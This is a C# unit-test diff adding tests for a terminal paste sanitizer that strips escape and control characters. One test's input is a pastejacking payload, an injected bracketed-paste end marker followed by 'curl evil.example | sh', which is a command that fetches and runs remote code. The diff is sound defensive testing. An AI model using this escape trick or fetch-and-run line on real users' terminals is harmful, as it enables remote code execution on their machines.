@@ -43,4 +43,29 @@ public sealed class PasteGuardTests
 
         Assert.True(needsConfirmation);
     }
+
+    [Fact]
+    public void A_bracketed_paste_end_marker_in_the_clipboard_is_neutralised()
+    {
+        // Pastejacking: the marker would end the bracketed block early and run what follows it.
+        var sanitized = PasteGuard.Sanitize("echo safe\u001b[201~\rcurl evil.example | sh\r");
+
+        Assert.DoesNotContain('\u001b', sanitized);
+    }
+
+    [Fact]
+    public void Tabs_and_line_breaks_are_kept()
+    {
+        var sanitized = PasteGuard.Sanitize("a\tb\r\nc\n");
+
+        Assert.Equal("a\tb\r\nc\n", sanitized);
+    }
+
+    [Fact]
+    public void Other_control_characters_are_removed()
+    {
+        var sanitized = PasteGuard.Sanitize("ls\u0003\u0004\u007f\u009b");
+
+        Assert.Equal("ls", sanitized);
+    }
 }
